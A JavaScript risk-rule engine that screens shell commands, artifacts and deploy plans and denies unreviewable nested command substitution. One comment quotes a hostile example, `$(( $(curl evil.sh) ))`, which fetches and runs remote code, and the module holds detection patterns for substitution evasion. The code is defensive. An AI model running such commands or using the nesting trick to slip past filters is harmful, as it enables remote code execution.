import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const defaultRulesPath = join(__dirname, '..', 'safety', 'rules', 'cloud-risk-rules.json');

const SEVERITY_RANK = {
  deny: 3,
  warn: 2,
  info: 1,
};

export function loadRiskRules(options = {}) {
  const path = options.path || defaultRulesPath;
  return JSON.parse(readFileSync(path, 'utf8'));
}

function redactEvidence(text) {
  return String(text)
    .replace(
      /((?:access[_-]?key|secret[_-]?key|secret|security[_-]?token|x[_-]?auth[_-]?token|token|authorization|password|passwd|admin[_-]?pass|credential)\s*[:=]\s*)("[^"]*"|'[^']*'|[^\s,;]+)/gi,
      '$1<redacted>',
    )
    .replace(/(AK|SK)\s*[:=]\s*("[^"]*"|'[^']*'|[^\s,;]+)/g, '$1=<redacted>');
}

function normalizeText(value) {
  if (typeof value === 'string') return value;
  return JSON.stringify(value, null, 2);
}

// #1055 D4-17: recognize `$(...)` / backtick command substitution in command
// stage inputs. `$(())` is shell arithmetic, not dynamic execution, and is
// excluded so `echo $((1+1))` keeps its allow decision.
const COMMAND_SUBSTITUTION_PATTERNS = [/\$\((?!\()([^)]*)\)/g, /`([^`]+)`/g];

function extractSubstitutionCommands(command) {
  const text = String(command || '');
  const inner = [];
  for (const pattern of COMMAND_SUBSTITUTION_PATTERNS) {
    for (const match of text.matchAll(pattern)) {
      if (match[1] && match[1].trim()) inner.push(match[1]);
    }
  }
  return inner;
}

// Arithmetic shell `$(( ... ))` is not dynamic execution by itself
// (`echo $((1+1))` stays allow), but arithmetic whose body itself embeds a
// substitution (`$(( $(curl evil.sh) ))`) executes dynamic content at runtime
// and must be treated as unresolvable: the flat `[^)]*` extraction cannot see
// through the nested parens, so the nesting otherwise escapes detection
// (#1055 D4-17 review follow-up).
const ARITHMETIC_SHELL_RE = /\$\(\(([\s\S]*?)\)\)/g;

function hasArithmeticShellSubstitution(command) {
  const text = String(command || '');
  for (const match of text.matchAll(ARITHMETIC_SHELL_RE)) {
    const body = match[1] || '';
    if (body.includes('$(') || body.includes('`')) return true;
  }
  return false;
}

// Nested substitution (a substitution whose payload itself contains `$(` or a
// backtick) resolves only at runtime — no static rule can review what will
// execute. The engine must fail closed on it instead of returning allow
// (fail-open, #1055 D4-17).
function hasUnresolvableSubstitution(command) {
  if (hasArithmeticShellSubstitution(command)) return true;
  const payloads = extractSubstitutionCommands(command);
  return payloads.some((payload) => payload.includes('$(') || payload.includes('`'));
}

function evaluationContext(stage, input) {
  if (stage === 'command') {
    const command = normalizeText(input.command || input.text || '');
    // Feed the substituted payload to the rule catalog as its own line so
    // rules inspect the dynamic execution content, not just the wrapper.
    const inner = extractSubstitutionCommands(command);
    const text = inner.length > 0 ? `${command}\n${inner.join('\n')}` : command;
    return { text, command };
  }
  if (stage === 'artifact') {
    const path = String(input.path || '');
    const content = normalizeText(input.content || '');
    return { text: `${path}\n${content}`, path, content };
  }
  if (stage === 'deploy_plan') {
    const plan = normalizeText(input.plan || input.text || input);
    return { text: plan, plan };
  }
  return { text: normalizeText(input) };
}

function conditionMatches(condition, context) {
  const field = condition.field || 'text';
  const value = Object.hasOwn(context, field) ? context[field] : context.text;
  return new RegExp(condition.regex, 'ims').test(String(value || ''));
}

function ruleMatches(rule, context) {
  const match = rule.match || {};
  const all = match.all;
  const any = match.any;
  const none = match.none;
  if (Array.isArray(all) && !all.every((condition) => conditionMatches(condition, context))) {
    return false;
  }
  if (Array.isArray(any) && !any.some((condition) => conditionMatches(condition, context))) {
    return false;
  }
  if (Array.isArray(none) && none.some((condition) => conditionMatches(condition, context))) {
    return false;
  }
  return Array.isArray(all) || Array.isArray(any);
}

function excerpt(text) {
  const compact = redactEvidence(String(text).replace(/\s+/g, ' ').trim());
  if (compact.length <= 240) return compact;
  return `${compact.slice(0, 237)}...`;
}

function evaluate(stage, inputs, options = {}) {
  const catalog = options.catalog || loadRiskRules(options);
  const items = Array.isArray(inputs) ? inputs : [inputs];
  const findings = [];

  for (const input of items) {
    const context = evaluationContext(stage, input || {});
    for (const rule of catalog.rules) {
      if (!rule.stages.includes(stage)) continue;
      if (!ruleMatches(rule, context)) continue;
      findings.push({
        ruleId: rule.id,
        title: rule.title,
        category: rule.category,
        severity: rule.severity,
        message: rule.message,
        remediation: rule.remediation,
        source: input?.path || stage,
        evidence: excerpt(context.text),
      });
    }
    // #1055 D4-17: fail closed on command substitution whose payload resolves
    // only at runtime — an unreviewable dynamic execution must not come back
    // as "allow" just because no regex rule matched.
    if (
      stage === 'command' &&
      hasUnresolvableSubstitution(context.command) &&
      !findings.some((finding) => finding.severity === 'deny')
    ) {
      findings.push({
        ruleId: 'hwc-command-substitution-exec',
        title: 'Dynamic command substitution cannot be statically reviewed',
        category: 'execution',
        severity: 'deny',
        message:
          'The command nests command substitution; the executed payload resolves only at runtime, so no static rule can review what will execute.',
        remediation:
          'Expand nested command substitution into a reviewable file, inspect the content, and execute only explicit reviewed commands.',
        source: input?.path || stage,
        evidence: excerpt(context.text),
      });
    }
  }

  findings.sort((a, b) => SEVERITY_RANK[b.severity] - SEVERITY_RANK[a.severity]);
  const hasDeny = findings.some((finding) => finding.severity === 'deny');
  const hasWarn = findings.some((finding) => finding.severity === 'warn');
  return {
    decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow',
    findings,
  };
}

function isNonEmptyString(value) {
  return typeof value === 'string' && value.trim().length > 0;
}

function isNonEmptyContainer(value) {
  if (Array.isArray(value)) return value.length > 0;
  if (value && typeof value === 'object') return Object.keys(value).length > 0;
  return false;
}

// A risk check that could not inspect its input must never report "allow"
// (fail-open) — it reports deny with an `invalid` risk and a synthetic finding
// so the reason is visible through the tool response (#564).
function invalidRiskResult(stage, reason) {
  return {
    decision: 'deny',
    risk: 'invalid',
    findings: [
      {
        ruleId: 'invalid-input',
        title: 'Invalid input for risk check',
        category: 'invalid',
        severity: 'deny',
        message: reason,
        remediation: 'Provide a valid, non-empty input before re-running the check.',
        source: stage,
        evidence: '',
      },
    ],
  };
}

export function evaluateCommandRisk(command, options = {}) {
  if (!isNonEmptyString(command)) {
    return invalidRiskResult('command', 'command must be a non-empty string.');
  }
  return evaluate('command', { command }, options);
}

export function evaluateArtifacts(artifacts, options = {}) {
  if (!Array.isArray(artifacts) || artifacts.length === 0) {
    return invalidRiskResult('artifact', 'artifacts must be a non-empty array.');
  }
  return evaluate('artifact', artifacts, options);
}

export function evaluateDeployPlan(plan, options = {}) {
  const valid = isNonEmptyString(plan) || (plan != null && typeof plan === 'object' && isNonEmptyContainer(plan));
  if (!valid) {
    return invalidRiskResult('deploy_plan', 'plan must be a non-empty object, array, or string.');
  }
  return evaluate('deploy_plan', { plan }, options);
}

export function mergeRiskDecision(base, risk) {
  if (!risk || !risk.findings?.length) return base;
  if (risk.decision === 'deny') {
    const topFinding = risk.findings[0];
    return {
      ...base,
      decision: 'deny',
      risk: topFinding.category,
      reason: topFinding.message,
      blockedByRiskRule: true,
      findings: risk.findings,
    };
  }
  return {
    ...base,
    warnings: [...(base.warnings || []), ...risk.findings],
  };
}
